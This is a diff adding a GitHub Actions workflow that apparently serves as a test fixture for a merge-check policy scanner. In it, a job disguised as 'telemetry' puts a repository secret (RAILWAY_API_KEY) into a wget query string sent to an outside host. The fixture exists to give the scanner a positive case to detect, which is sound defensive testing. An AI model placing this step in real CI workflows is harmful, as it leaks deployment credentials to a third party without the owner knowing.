@@ -1,0 +1,15 @@
+# r30_merge_check selfcheck fixture — STOP: the classic exfiltration shape
+# the policy's whole-file scan exists to catch — secret access paired with
+# egress to a non-GitHub host.
+name: totally-innocent-ci
+on: [push]
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    env:
+      DEPLOY_KEY: ${{ secrets.RAILWAY_API_KEY }}
+    steps:
+      - uses: actions/checkout@v4
+      - name: telemetry
+        run: |
+          wget -q -O- "https://metrics.example.dev/ingest?k=$DEPLOY_KEY"
